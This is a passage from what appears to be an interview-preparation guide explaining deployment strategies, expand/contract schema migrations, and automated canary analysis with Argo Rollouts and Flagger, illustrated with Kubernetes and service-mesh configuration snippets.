This is the topic that reveals whether you've actually operated production. Anyone can recite "blue-green vs canary"; the signal is in the tradeoffs and the ugly parts. Can you explain why rolling gives you mixed versions and what that means for API/schema compatibility? Do you know blue-green's instant rollback comes with double cost *and* a database problem? Can you separate deploy from release with flags? And crucially — **do you have a rollback plan for each strategy**, or do you find out in the incident? Senior candidates lead with "it depends on statefulness, risk tolerance, and cost" and then reason about the *database*, which is where zero-downtime actually gets hard. Junior answers stop at the happy-path traffic switch and forget that a schema change or an in-flight session can break the whole thing.

**Common confusions**

- "Rolling update is zero-risk" — during the roll you have *both versions live*, so your API and DB must be compatible with both, or requests fail mid-rollout.
- "Blue-green and canary are the same" — blue-green flips *all* traffic at once after testing; canary shifts a *small percentage* and ramps gradually while measuring.
- "Canary and A/B testing are the same" — canary is a *deployment-safety* mechanism (watch for regressions); A/B testing is a *product experiment* (which variant converts better), routed by user attribute.
- "Feature flags are a deployment strategy" — they're a *release* strategy; they decouple exposure from the deploy, and complement any deployment strategy.
- "Blue-green means you don't need to think about the database" — the shared database is exactly what makes the flip and the rollback hard; schema changes must be backward compatible.
- "Rollback is just redeploy the old version" — for a rolling deploy that's slow and re-runs the whole roll; blue-green flips back instantly; a flagged feature just gets toggled off.

**What follows from this topic**

These strategies are the vocabulary the next topic automates. **Progressive Delivery & Canary Analysis** takes the *canary* here and puts it on autopilot — automated metric analysis decides whether to ramp or abort, via Argo Rollouts/Flagger. The **feature-flag** idea reappears there as "application-level progressive delivery." The traffic-shifting mechanics (LB/ingress/service-mesh weights) are exactly what canary controllers manipulate. And the database/backward-compatibility discipline here is the precondition that makes *any* automated progressive rollout safe — you can't auto-canary a breaking schema change.

### Q1. Compare the main deployment strategies and their tradeoffs.

| Strategy | Downtime | Rollback speed | Infra cost | Mixed versions? | Best for |
|---|---|---|---|---|---|
| **Recreate** | Yes | Redeploy old | 1x | No | Dev, non-critical, incompatible versions |
| **Rolling** | No | Slow (re-roll) | ~1x | Yes, during roll | Stateless services, K8s default |
| **Blue-green** | No | **Instant flip** | **2x** | No (clean cut) | Fast rollback needs, risky releases |
| **Canary** | No | Fast (abort) | ~1x + a bit | Yes, controlled | High-risk changes, when you have metrics |

The axes that matter are **downtime, rollback speed, cost, and whether old/new coexist** (which forces compatibility work). Recreate is simplest but takes an outage. Rolling is the cheap no-downtime default but gives you mixed versions. Blue-green buys instant rollback with double infra. Canary is the safest for risk but needs traffic splitting and good observability. There is no universally best choice — you pick per statefulness, risk tolerance, and budget.

### Q2. Explain the recreate strategy and when it's actually the right choice.

**Recreate**: terminate every old instance, then start the new ones. There is a window where nothing is serving — *downtime*.

```yaml
spec:
  strategy:
    type: Recreate
```

It sounds primitive, but it's the correct choice when:

- **The old and new versions cannot coexist** — e.g. an incompatible schema change or an exclusive resource (a singleton lock, a migration that rewrites data in place) where running both simultaneously would corrupt state.
- **Downtime is acceptable** — internal tools, batch systems, dev/staging, or anything with a maintenance window.
- **Simplicity beats availability** — you avoid all the mixed-version compatibility headaches of rolling/canary.

The honest tradeoff: it's the only strategy that *guarantees* no version overlap, which is occasionally exactly what a stateful cutover needs. Elsewhere, its downtime makes it a non-starter.

### Q3. How does a rolling update work in Kubernetes, and what do maxSurge and maxUnavailable control?

A rolling update replaces pods **incrementally** — spin up some new pods, wait for them to pass readiness, terminate an equal number of old ones, repeat until fully rolled. No downtime, roughly constant capacity.

```yaml
spec:
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 25%          # up to 25% EXTRA pods above desired during the roll
      maxUnavailable: 0      # never drop below desired capacity
```

- **maxSurge** — how many pods *above* the desired count you may temporarily add. Higher = faster roll, more transient resource use.
- **maxUnavailable** — how many pods below desired you may drop. `0` keeps full capacity (needs surge headroom); higher rolls faster but reduces capacity mid-roll.

The catch: **during the roll both versions serve live traffic**, so v1 and v2 must be API- and DB-compatible. And **rollback is slow** — it's just another rolling update in reverse, re-cycling every pod. Readiness/health checks gate each step, so a broken new pod stalls the roll rather than taking the service down.

### Q4. Explain blue-green deployment. What are its costs and its hardest problem?

**Blue-green** runs two identical, full production environments. Blue serves live traffic; you deploy the new version to the idle **green**, smoke-test it in isolation, then **flip the router/load balancer** so all traffic goes to green at once. Blue stays warm as an instant rollback target.

```bash
# green is deployed and verified out of band, then:
kubectl patch service my-app -p '{"spec":{"selector":{"version":"green"}}}'
# rollback == flip the selector back to blue, instantly
```

Strengths: **instant, clean cutover** and **instant rollback** (flip back) — no re-rolling pods, no mixed versions in steady state.

Costs and the hard problem:

- **Double infrastructure** — you run two full environments (mitigated somewhat by only scaling green up around the cutover).
- **The database** — blue and green almost always share one database, so the *schema must be backward compatible with both versions*, and after you flip, a rollback means the old code must still work against the migrated schema. This is why blue-green doesn't free you from expand/contract migrations — the shared DB is the real constraint, not the traffic flip.

### Q5. Explain canary deployment and why it's considered the safest for risky changes.

**Canary**: release the new version to a *small percentage* of traffic first (say 5%), watch its error rate and latency against the stable version, then **gradually ramp** — 5% → 25% → 50% → 100% — or **abort** and route everyone back to stable if metrics degrade.

```yaml
# conceptual weighted split at the ingress/mesh
- route:
    - destination: { host: my-app, subset: stable }
      weight: 95
    - destination: { host: my-app, subset: canary }
      weight: 5
```

Why it's safest for risk: a bug only ever hits the small canary slice before you catch it, so the **blast radius is bounded**. You're validating on *real production traffic and data* — not a staging approximation — which surfaces problems synthetic tests miss.

Its requirements are the flip side: you need **traffic-splitting** (ingress/service mesh) and **good metrics** to judge canary vs baseline. A naive percentage ramp *without* watching metrics isn't really a canary — it's just a slow rollout of a bug. That measurement-driven promotion is exactly what the next topic (canary analysis) automates.

### Q6. What is shadow (dark) traffic mirroring, and when would you use it?

**Shadow / dark launch** sends a *copy* of real production traffic to the new version while the new version's responses are **discarded** — users only ever see the stable version's response. You're testing the new code under genuine production load and data patterns with **zero user-facing risk**.

```yaml
# Istio-style mirror: 100% served by stable, mirrored copy to v2
- route:
    - destination: { host: my-app, subset: stable }
  mirror: { host: my-app, subset: v2 }
  mirrorPercentage: { value: 100.0 }
```

Use it when:

- You're rewriting a hot path and want to see how it behaves under real load before serving it.
- You need to validate performance/scaling against production traffic shapes that staging can't reproduce.
- You want to compare outputs (shadow the new version and diff its responses offline).

The big caveat: **watch side effects.** If the shadowed version writes to the database, sends emails, or calls a payment API, mirroring will double those effects — shadow only works cleanly for read-mostly paths or when writes are stubbed/sandboxed.

### Q7. How is A/B testing different from a canary deployment?

They look similar (both route a subset of traffic to a new version) but answer different questions.

| | Canary | A/B testing |
|---|---|---|
| Goal | **Deployment safety** — is the new version healthy? | **Product experiment** — which variant performs better? |
| Routing basis | Random % of traffic | **User attributes** (segment, geo, cohort) |
| Success metric | Error rate, latency, saturation | Conversion, engagement, revenue |
| Decision | Promote or roll back | Keep the winning variant |
| Duration | Minutes to hours | Days to weeks (statistical significance) |

A canary asks "will this break?" and watches golden signals. A/B testing asks "does variant B convert better than A?" and routes deterministically by user attribute to measure a *business* outcome. They share the traffic-routing plumbing (often feature flags), which is why they're related and frequently confused — but a canary is an operational safety gate, A/B is a product methodology.

### Q8. What are feature flags, and how do they decouple deploy from release?

A **feature flag** (toggle) is a runtime conditional that turns behaviour on or off *without redeploying*. You ship the new code to production **dark** (flag off), then flip it on via config — for everyone, or a cohort, or a percentage.

```javascript
if (flags.isEnabled('new-checkout', { userId })) {
  return newCheckout(cart);
}
return legacyCheckout(cart);
```

This **decouples deploy from release**:

- **Deploy** = the code is on the machines (flag off, invisible).
- **Release** = flip the flag to expose the behaviour — a config change, seconds, no pipeline.

The payoffs: **gradual rollout** (ramp the flag 1% → 100%), an **instant kill switch** (flag off disables a bad feature with *no rollback deploy*), and the ability to merge-and-deploy continuously while releasing on a separate schedule. Tools: LaunchDarkly, Unleash, Flagsmith. The cost is **flag debt** — stale flags multiply code paths, so you must retire them once fully rolled out.

### Q9. What's the rollback strategy for each deployment approach?

Rollback speed is a defining property of each strategy — know them cold:

- **Recreate** — redeploy the previous version; incurs the same downtime window again. Slowest and most disruptive.
- **Rolling** — roll *back* is another rolling update in reverse, re-cycling every pod to the old version. No downtime but **slow**, and you're mixed-version again on the way back.
- **Blue-green** — **flip the router back to blue.** Near-instant, because the old environment is still running. The gold standard for rollback speed.
- **Canary** — **abort**: set the canary weight to 0, all traffic returns to stable. Fast, and only a small slice was ever affected.
- **Feature flag** — **toggle off.** Instant, no deploy at all, sub-second. The fastest possible "rollback" because you never rolled the binary.

The senior point: **the database can invalidate all of these.** If the new version ran an irreversible or non-backward-compatible migration, flipping traffic back to old code hits a schema old code can't handle. Fast rollback requires backward-compatible schema changes (expand/contract) — the traffic mechanism is the easy half.

### Q10. Zero-downtime deploys and databases: explain the expand/contract pattern.

The database is the hardest part of zero-downtime because old and new code transiently share one schema, and rollback must still work. **Expand/contract (parallel change)** makes schema changes in backward-compatible steps, decoupling the schema change from the code deploy.

Renaming a column `name` → `full_name`:

1. **Expand** — add the new `full_name` column (nullable). Schema now supports both. Deploy nothing yet.
2. **Migrate + dual-write** — deploy code that writes *both* columns and reads the old one; backfill `full_name` from `name`.
3. **Switch reads** — deploy code that reads `full_name`. Old code (writing both) is still compatible.
4. **Contract** — once nothing references `name`, drop it in a later, separate deploy.

Each step is independently deployable and **backward compatible**, so at no point does a live version see a schema it can't handle, and you can roll back one step safely. The rule: **never make a breaking schema change in the same deploy as the code that needs it** — split it across expand and contract.

### Q11. How do health checks gate a rollout?

Health checks are the automated signal that decides whether the rollout proceeds or stalls. In Kubernetes there are three probes:

- **Readiness** — is this pod ready to *receive traffic*? Until it passes, the pod isn't added to the service endpoints. A rolling update **won't proceed to the next batch** until new pods are ready, so a broken new version *stalls the roll instead of taking the service down.*
- **Liveness** — is the process wedged and needing a *restart*?
- **Startup** — for slow-booting apps, gives them time before liveness kicks in.

```yaml
readinessProbe:
  httpGet: { path: /healthz, port: 8080 }
  initialDelaySeconds: 5
  periodSeconds: 5
```

The gating effect: with `maxUnavailable: 0`, if new pods never become ready, the deployment holds at the old version and surfaces `progressDeadlineExceeded` rather than degrading. A *good* readiness endpoint checks real dependencies (DB reachable, migrations applied) — a health check that always returns 200 defeats the entire safety mechanism.

### Q12. Explain traffic shifting — how is traffic actually moved between versions?

Traffic shifting is moving weighted proportions of requests between versions, and *where* it happens defines your granularity:

- **Load balancer / DNS** — coarsest; flip a target group (blue-green) or weight two groups. Simple, but limited routing logic.
- **Ingress controller** (NGINX/Traefik) — canary annotations set percentage weights at the edge.
- **Service mesh** (Istio/Linkerd) — finest control: weighted routing *between subsets*, header/attribute-based routing, and **mirroring** for shadow traffic, all without touching app code.

```yaml
# ingress-nginx canary: 10% to the canary service
metadata:
  annotations:
    nginx.ingress.kubernetes.io/canary: "true"
    nginx.ingress.kubernetes.io/canary-weight: "10"
```

The mesh matters for canary/progressive delivery because it can do **fine-grained weight steps** (1%, 5%, 25%) and route by user attribute, which coarse LB-level shifting can't. Whatever the layer, the mechanism is the same idea: two backends, a weight, and a controller that moves the weight — manually here, automatically in the next topic.

### Q13. How do you drain connections and handle in-flight requests during a deploy?

When you terminate an old instance you must let in-flight requests finish, or users get dropped connections mid-request. This is **connection/session draining**.

In Kubernetes:

- On pod termination, Kubernetes sends `SIGTERM` and simultaneously removes the pod from service endpoints (stops *new* traffic).
- A **`preStop` hook** plus a sensible **`terminationGracePeriodSeconds`** gives in-flight requests time to complete before `SIGKILL`.

```yaml
lifecycle:
  preStop:
    exec: { command: ["sleep", "15"] }   # let LB deregister + drain
terminationGracePeriodSeconds: 30
```

- The **app must handle `SIGTERM` gracefully** — stop accepting new work, finish current requests, close DB connections, then exit.
- For **sticky sessions**, either externalise session state (Redis) so any instance can serve, or drain by letting sessions expire before killing the instance.

Skip draining and even a "zero-downtime" rolling update drops requests every time a pod cycles — a subtle bug that only shows up under load.

### Q14. How do you choose a deployment strategy for a given scenario?

I reason from four inputs: **statefulness, risk tolerance, cost budget, and rollback requirements.**

- **Stateless, low-risk service, cost-sensitive** → **rolling update.** Cheap, no downtime, good enough. The sensible default.
- **High-risk change, good metrics available** → **canary** (ideally automated). Bounded blast radius, real-traffic validation.
- **Need instant rollback / risky big-bang release / can afford 2x infra** → **blue-green.** Clean cut, flip-back safety.
- **Incompatible versions or acceptable maintenance window** → **recreate.** Only when overlap is impossible or downtime is fine.
- **Want to release features independently of deploys** → any deployment strategy **plus feature flags** to control exposure at runtime.

Then I overlay the **database**: any strategy demands backward-compatible schema changes for safe rollback. And I ask "how do we roll back, and have we tested it?" — the strategy is only as good as its rollback story. Naming those tradeoffs explicitly is what the question is really testing.

### Q15. Design a zero-downtime deployment with automated rollback for a change that includes a schema migration.

I'd combine expand/contract migrations, a canary rollout, and metric-gated automated rollback:

1. **Expand the schema first, separately** — additive, backward-compatible migration (new nullable column/table). Old and new code both work. Deploy this on its own.
2. **Build once** — one immutable image digest, scanned and signed, promoted through environments.
3. **Canary the new code** — shift 5% of traffic to the new version via the service mesh; it dual-writes old+new schema.
4. **Automated analysis** — compare canary error rate and p99 latency against baseline for a bake period; **auto-abort (weight → 0) on SLO breach**, else ramp 5 → 25 → 50 → 100%.
5. **Switch reads** in a subsequent deploy once fully rolled out and stable.
6. **Contract** — drop the old column in a later deploy, after confirming nothing reads it.

**Rollback story:** during the canary, abort returns traffic to stable instantly; because the schema is still backward compatible (expand only, not yet contracted), stable code runs fine against it. The migration is *never* the thing being rolled back mid-deploy — that's the whole point of splitting expand from contract. Feature-flag the risky behaviour too, for a sub-second kill switch independent of the traffic shift.

### Q16. What's wrong with this deploy: a single PR bumps the app version, drops a column, and does a rolling update?

Two coupled defects, both classic zero-downtime traps:

**1. Breaking schema change during a rolling update.** A rolling update runs **old and new pods simultaneously**. The moment the migration drops the column, the still-running *old* pods query a column that no longer exists and start erroring — mid-rollout, on live traffic. You've created an outage during a "zero-downtime" deploy.

**2. No safe rollback.** If the new version misbehaves, rolling back re-cycles pods to old code — which now also can't find the dropped column. The migration made the rollback impossible.

**The fix — decouple and sequence:**

- Split into **expand** (this deploy: additive only) and **contract** (a *later* deploy: drop the column) with the code migrated to the new column in between.
- Never combine a **breaking** schema change with the code deploy in one step.
- Keep each intermediate state backward compatible so old and new pods coexist safely and rollback always works.

The root cause is coupling a breaking data change to a gradual-rollout mechanism that guarantees version overlap.

### Q17. Walk me through downtime vs cost vs complexity across the strategies — how do you frame the decision to a team?

I frame it as picking a point on three sliders, because you can't max all three:

- **Recreate** — lowest cost, lowest complexity, but you *pay in downtime.* Fine for internal tools; unacceptable for customer-facing prod.
- **Rolling** — no downtime, ~1x cost, low complexity — but you *pay in mixed-version compatibility work* and slow rollback. The pragmatic default.
- **Blue-green** — no downtime, instant rollback, but you *pay in 2x infrastructure cost* and the shared-DB migration problem.
- **Canary / progressive** — no downtime, smallest blast radius, fastest safe validation — but you *pay in operational complexity*: traffic splitting, metrics, and analysis tooling.
- **Feature flags** — cut across all of the above: they *add* release control and instant kill switches, but *pay in flag debt* and testing-matrix complexity.

The conversation with a team is: *how much is an outage worth, how fast must we roll back, and what infra/complexity can we afford?* Start most services on rolling, graduate high-risk or high-availability services to canary/blue-green, and layer feature flags for release control. Match the ceremony to the risk — don't run automated canary analysis on a low-traffic internal CRUD app, and don't recreate-deploy the payment service.

## Progressive Delivery & Canary Analysis

### Summary

**What this topic covers**

The evolution of continuous delivery from "ship it and watch a dashboard by hand" into **progressive delivery**: gradually exposing a release *and automating the decision* to promote or roll back based on metrics. This topic covers automated **canary analysis** (define success metrics, compare canary against the stable baseline, promote if healthy, auto-rollback if not — the "judge/analysis" concept), the two dominant Kubernetes tools — **Argo Rollouts** (a `Rollout` CRD replacing `Deployment` with declarative canary/blue-green steps and `AnalysisTemplate`s) and **Flagger** (the same idea for Flux + service meshes) — the traffic-shifting substrate (service mesh / ingress weighted routing and mirroring), the metrics that gate promotion (SLOs, golden signals, error budgets), **ring deployments**, mixing automated steps with manual approval gates, the relationship to **feature flags** (app-level vs infra-level progressive delivery), load/soak testing during a canary, why **observability** is a hard prerequisite, and how progressive delivery composes with **GitOps**. The 15 questions move from "what is progressive delivery" to "design an automated canary with metric analysis and abort, and explain what makes a naive percentage ramp dangerous."

**Mental model**

Progressive delivery is **canary on autopilot with a control loop.** A plain canary (previous topic) needs a human to watch Grafana and decide whether to ramp or abort. Progressive delivery encodes that human judgement as **automated analysis**: at each traffic step, a controller queries your metrics backend (Prometheus/Datadog), compares the canary's error rate / latency / saturation against the stable baseline, and *decides* — proceed to the next weight, hold, or abort and roll back — with no human in the loop for the happy path. Think of it as a feedback controller: setpoint = your SLOs, measured variable = the canary's live metrics, actuator = the traffic weight. The release *drives itself* toward 100% only as long as the metrics stay healthy, and self-reverts the moment they don't. This is why observability is a hard dependency, not a nice-to-have: if you can't measure the canary accurately, the controller is flying blind and a naive percentage ramp is just a slow-motion outage.

**Key terms**

- **Progressive delivery** — gradually expose a release *plus* automate the promote/rollback decision from metrics.
- **Canary analysis** — automated comparison of canary vs baseline on success metrics to decide promotion.
- **Analysis / judge** — the component (e.g. Argo `AnalysisTemplate`) that queries metrics and returns pass/fail per step.
- **Argo Rollouts** — a Kubernetes controller; the `Rollout` CRD replaces `Deployment` with declarative canary/blue-green steps and inline analysis.
- **Flagger** — a progressive-delivery operator for Flux; drives service-mesh/ingress traffic shifting with metric checks and webhooks.
- **setWeight / pause** — Rollout steps: set the canary traffic percentage, then pause (for a duration or an analysis run) before the next.
- **Golden signals** — latency, traffic, errors, saturation — the canonical metrics to gate a promotion on.
- **SLO / error budget** — the reliability target and its remaining allowance; breaching the budget triggers auto-rollback.
- **Ring deployment** — roll out to concentric audiences (internal → early adopters → everyone) to widen the blast radius gradually.
- **Traffic mirroring** — copy traffic to the canary for load/soak testing without serving its responses.
- **Blast radius** — the fraction of users/traffic a bad release can affect; progressive delivery minimises it.
- **GitOps** — desired state (including the Rollout spec) lives in Git; a controller reconciles the cluster to match.

**Why interviewers ask this**

This is the frontier topic — it separates engineers who *deploy* from engineers who *build the delivery platform*. The signal is whether you understand that the hard part isn't shifting traffic (any mesh does that) but **automating the judgement**: which metrics, compared how, against what baseline, over what sample size, with what abort criteria. A junior says "we do canary deployments." A senior says "we run 5/25/50 canary steps with an AnalysisTemplate querying the p99 latency and error-rate SLO against the stable baseline, auto-aborting on a two-interval breach, and we know a naive percentage ramp without analysis is worthless." It also probes the observability dependency (you can't do this without good metrics), the feature-flag relationship (app-level vs infra-level exposure control), and GitOps integration. It's where CI/CD, SRE, and platform engineering converge.

**Common confusions**

- "Progressive delivery is just canary deployment" — canary is the *traffic pattern*; progressive delivery adds the *automated, metric-driven decision* on top.
- "The tool shifts traffic, so we're safe" — traffic shifting without **analysis** is a naive percentage ramp; it exposes the bug slowly instead of catching it. The analysis is the point.
- "Argo Rollouts and Flagger do fundamentally different things" — same idea (automated progressive delivery on K8s); Argo uses a `Rollout` CRD, Flagger drives standard Deployments via Flux + mesh. Different ecosystems, same concept.
- "Feature flags and canary analysis are alternatives" — they operate at different layers: flags = *application-level* exposure control, canary = *infrastructure-level* traffic control. They compose.
- "Any metric works as a gate" — you need SLO-relevant, low-noise signals (golden signals) and enough sample size, or the analysis produces false pass/fail.
- "You can bolt this on without observability" — the metrics backend *is* the decision-maker; poor observability makes progressive delivery dangerous, not just hard.

**What follows from this topic**

This topic is the automated apex of the deployment strategies covered previously — it takes the manual canary and closes the loop. It leans hard on the **observability** primer (golden signals, SLOs, error budgets are the gate) and on **container image pipelines** (you promote a signed, scanned *digest* through the canary). It also completes the **GitOps** story: the desired `Rollout` state lives in Git, the controller reconciles and runs the analysis, so a metric-driven rollback is itself a reconciliation, not a manual `kubectl`. Together with feature flags, it gives you exposure control at both the infrastructure and application layers.

### Q1. What is progressive delivery, and how is it the evolution of continuous delivery?

**Progressive delivery** is continuous delivery plus two things: **gradual exposure** of a release and **automated, metric-driven decisions** about whether to keep going or roll back.

Classic CD gets a green build to production and, at most, does a manual canary where a human watches dashboards and decides. Progressive delivery **automates that judgement**:

- Roll the new version out to a small slice of traffic.
- **Automatically analyse** its live metrics (errors, latency, saturation) against the stable baseline.
- **Promote** (ramp to the next weight) if healthy; **auto-roll back** if not — no human on the happy path.

So the evolution is: manual watch-and-decide → an **automated control loop** that drives the release toward 100% only while the metrics stay within SLO, and self-reverts otherwise. It's "canary on autopilot." The advance isn't the traffic shifting — CD tools already had that — it's removing the human from the promote/abort decision and encoding it as policy.

### Q2. Explain automated canary analysis. What does the "analysis" actually do?

Automated canary analysis is the component that turns "a human watching Grafana" into a **programmatic judge.** At each traffic step it:

1. **Queries the metrics backend** (Prometheus, Datadog, CloudWatch) for the canary's success metrics — error rate, p99 latency, saturation.
2. **Compares against a baseline** — usually the stable version running in parallel (comparing canary-vs-stable, not canary-vs-history, controls for load/time-of-day effects).
3. **Applies pass/fail thresholds** — e.g. error rate < 1%, p99 < 500ms, over a sample interval.
4. **Returns a verdict** — pass → proceed to the next weight; fail (often requiring N consecutive failing intervals to avoid noise) → **abort and roll back.**

```yaml
metrics:
  - name: error-rate
    interval: 1m
    successCondition: result < 0.01
    failureLimit: 2        # abort after 2 failing intervals
    provider:
      prometheus:
        query: |
          sum(rate(http_requests_total{job="canary",status=~"5.."}[1m]))
          / sum(rate(http_requests_total{job="canary"}[1m]))
```

The judge is the whole value proposition: it's the encoded operational judgement that decides promotion, so choosing the *right* metrics and thresholds is the real work.

### Q3. What is Argo Rollouts and how does it change how you deploy?

**Argo Rollouts** is a Kubernetes controller that replaces the built-in `Deployment` with a **`Rollout`** custom resource, adding first-class canary and blue-green strategies with **declarative steps** and **inline analysis.**

```yaml
kind: Rollout
spec:
  strategy:
    canary:
      steps:
        - setWeight: 10
        - pause: { duration: 5m }
        - analysis:
            templates: [{ templateName: success-rate }]
        - setWeight: 50
        - pause: { duration: 5m }
        - setWeight: 100
```

What changes:

- You declare the **rollout as a sequence of steps** — set weight, pause, run analysis, ramp — instead of a single strategy knob.
- **`AnalysisTemplate`s** query Prometheus/Datadog and **automatically abort** the rollout if a step fails.
- It integrates with service meshes / ingress to do the actual traffic shifting, and has a dashboard/CLI for promote/abort.

The mental shift: a deployment becomes a **declarative, automated progression** with metric gates baked in, rather than "apply the new image and hope." Because it's a CRD, the whole progressive-delivery policy lives in Git and fits GitOps.

### Q4. What is Flagger and how does it relate to Argo Rollouts?

**Flagger** is a progressive-delivery **operator** (from the Flux ecosystem) that automates canary, blue-green, and A/B rollouts by driving **service-mesh or ingress traffic shifting** (Istio, Linkerd, NGINX, App Mesh, Gateway API) combined with **metric checks and webhooks.**

```yaml
kind: Canary
spec:
  analysis:
    interval: 1m
    stepWeight: 10          # +10% traffic per successful interval
    maxWeight: 50
    threshold: 5            # abort after 5 failed checks
    metrics:
      - name: request-success-rate
        thresholdRange: { min: 99 }
      - name: request-duration
        thresholdRange: { max: 500 }
    webhooks:
      - name: load-test      # generate traffic / run acceptance tests during canary
        url: http://flagger-loadtester/
```

Relationship to Argo Rollouts: **same core idea** — automated, metric-gated progressive delivery on Kubernetes — different implementation and ecosystem. Flagger wraps your *existing* `Deployment` and drives a mesh, and pairs naturally with **Flux** GitOps. Argo Rollouts introduces its *own* `Rollout` CRD and pairs naturally with **Argo CD**. Pick by which GitOps/mesh stack you already run; the concepts (steps, weights, analysis, abort) transfer directly.

### Q5. How does traffic shifting work in progressive delivery, and why is a service mesh useful here?

Progressive delivery needs to route a *precise, adjustable percentage* of traffic to the canary and change it over time — that's the actuator the control loop drives.

- **Service mesh** (Istio/Linkerd) — the sweet spot: fine-grained weighted routing between stable and canary subsets, header/attribute-based routing (for A/B or ring targeting), and **traffic mirroring** for shadow/soak testing — all declarative, no app changes.
- **Ingress / Gateway API** (NGINX, Contour) — weighted canary routing at the edge; coarser but often enough.
- **The controller manipulates the weights** — Argo Rollouts / Flagger set the mesh/ingress weight at each step (10 → 25 → 50), so the traffic split *is* the mechanism the analysis gates.

The mesh matters because progressive delivery wants **small, precise steps** (1%, 5%) and **per-request routing control** that coarse LB-level shifting can't give — plus mirroring for load testing the canary. It cleanly separates the traffic-control plane from application code, which is exactly what an automated controller needs to actuate.

### Q6. Which metrics should gate a canary promotion?

Gate on **SLO-relevant golden signals**, not vanity metrics. The four golden signals:

- **Errors** — error rate (5xx / total), the primary gate. A canary erroring above baseline aborts immediately.
- **Latency** — p95/p99 request duration. Averages hide tail regressions; gate on the tail.
- **Traffic** — request rate; used to confirm the canary is actually *receiving* representative load (a canary with no traffic yields a meaningless analysis).
- **Saturation** — CPU/memory/queue depth; catches a version that "works" but is about to fall over.

Principles:

- **Compare canary vs stable baseline**, not vs historical, to control for time-of-day and load.
- **Tie thresholds to SLOs / error budget** — the gate should be "are we within the reliability target," and a breach of the error budget triggers rollback.
- **Prefer low-noise, high-signal metrics** with enough sample size — a metric too noisy at canary traffic volume produces false aborts and false promotions.

Business metrics (conversion) can supplement but are usually too slow/noisy for the fast promote/abort loop.

### Q7. How does automated rollback on an SLO or error-budget breach work?

The controller continuously evaluates the canary's metrics against the SLO thresholds during each step. On breach it **aborts**: sets the canary weight to 0, routing all traffic back to the stable version, and marks the rollout degraded — no human needed.

- **Threshold + failure limit** — require N consecutive failing intervals (e.g. `failureLimit: 2`) so one noisy scrape doesn't trigger a false abort.
- **Error-budget framing** — the gate is often "is the canary burning error budget faster than allowed?" A fast burn rate trips the rollback.
- **Abort is instant and safe** — because only a small traffic slice was on the canary and the stable version never went away, returning to 100% stable is immediate.

```yaml
# Argo AnalysisTemplate: fail 2 intervals in a row -> Rollout aborts, weight -> 0
metrics:
  - name: error-rate
    failureLimit: 2
    successCondition: result < 0.01
```

This is the payoff of progressive delivery: the *machine* catches the regression within minutes and reverts, instead of a human noticing an hour later. Its correctness depends entirely on the metrics being trustworthy — hence the observability prerequisite.

### Q8. What are ring deployments?

**Ring deployments** roll a release out to **concentric audiences** of increasing size, widening the blast radius deliberately at each ring:

- **Ring 0** — internal/dogfooding users (your own team). Catches obvious breakage with zero external impact.
- **Ring 1** — early adopters / beta cohort / a low-risk region. Real users, bounded exposure.
- **Ring 2** — everyone.

You promote to the next ring only after the current ring stays healthy for a bake period. It's the same risk-reduction idea as canary, but the slices are **audience segments** (routed by user attribute or region) rather than an anonymous traffic percentage — so you can front-load the risk onto users who tolerate it. Microsoft popularised the model for shipping Windows/Office. Rings and percentage canaries compose: you can run an automated percentage canary *within* each ring. Both serve the same goal — never expose everyone at once, and grow exposure only as confidence grows.

### Q9. How do you mix manual approval gates with automated analysis in a rollout?

Progressive delivery isn't all-or-nothing on automation — you interleave **automated analysis steps** with **manual pause/approval steps** where human judgement or compliance requires it.

```yaml
strategy:
  canary:
    steps:
      - setWeight: 10
      - analysis: { templates: [{ templateName: success-rate }] }  # automated gate
      - setWeight: 50
      - pause: {}                # indefinite pause — waits for a human 'promote'
      - setWeight: 100
```

Patterns:

- **Automate the low-risk early steps** (10%, analysis) and require a **manual approval before the final push to 100%** or before entering a sensitive window.
- **`pause: {}`** (no duration) halts until a human runs `kubectl argo rollouts promote` — a deliberate approval gate.
- Use manual gates for **change-management/compliance** (a release must be signed off) or for **business-timing** (don't auto-complete during a peak-traffic event).

The goal is to automate the *judgement that metrics can make* and reserve humans for the judgement they can't — regulatory sign-off, business timing, "do we actually want this live now." Over-automating removes a valuable circuit breaker; over-gating removes the benefit.

### Q10. How do feature flags relate to progressive delivery and canary analysis?

They're **two layers of the same idea — controlled exposure — operating at different levels.**

| | Canary / progressive delivery | Feature flags |
|---|---|---|
| Layer | **Infrastructure** — traffic routing between versions | **Application** — runtime conditionals in code |
| Unit of control | % of traffic / pods | Individual feature, per user/cohort |
| Rollback | Abort → shift traffic to stable | Toggle off — instant, no traffic change |
| Granularity | Whole-service version | Single feature within a version |

They **compose**, they're not alternatives. Deploy the new *version* via an automated canary (infra-level), and within it gate the risky *feature* behind a flag (app-level). Now you have two independent kill switches: abort the rollout to revert the binary, or flip the flag to disable just the feature without touching the deployment. Feature flags are "application-level progressive delivery" — they let you ramp a feature 1% → 100% by user cohort entirely in config, while canary analysis ramps the *deployment* by traffic weight. Mature teams use both: infra-level for version safety, app-level for feature exposure and experiments.

### Q11. Why is observability a hard prerequisite for progressive delivery?

Because in progressive delivery **the metrics *are* the decision-maker.** The controller promotes or rolls back purely on what your telemetry reports — so the quality of that telemetry is the quality of your deploy safety.

- **No metrics, no analysis** — without a queryable backend (Prometheus/Datadog) exposing per-version error rate, latency, and saturation, there's nothing for the judge to evaluate; you're left with a naive percentage ramp.
- **Bad metrics, bad decisions** — noisy or unrepresentative signals cause **false aborts** (rolling back healthy releases) or, worse, **false promotions** (ramping a broken one to 100%). A canary with too little traffic yields statistically meaningless numbers.
- **You must label by version** — metrics have to distinguish canary from stable (e.g. a `version` label) so the comparison is valid.

This is the direct tie to the observability primer: golden signals, SLOs, and error budgets aren't just for on-call dashboards — they're the *inputs to an automated control loop.* Attempting progressive delivery on weak observability isn't merely hard, it's actively dangerous, because the automation will confidently make wrong promote/abort calls.

### Q12. How do load or soak testing fit into a canary?

You want the canary to face **representative load** before you trust its metrics — a canary receiving trivial traffic gives a meaningless analysis. Two techniques:

- **Traffic mirroring (shadow)** — mirror a copy of real production traffic to the canary so it's exercised under genuine load and data patterns while its responses are discarded. Great for **soak testing** — sustained real load over time to surface memory leaks, connection exhaustion, and slow degradation that a short canary window misses. Watch for write side effects.
- **Synthetic load generation** — tools like Flagger's built-in load tester (via a webhook) generate traffic against the canary during the analysis window so there's enough volume for statistically valid metrics, especially for low-traffic services.

```yaml
webhooks:
  - name: load-test
    url: http://flagger-loadtester/
    metadata: { cmd: "hey -z 2m -q 10 http://my-app-canary/" }
```

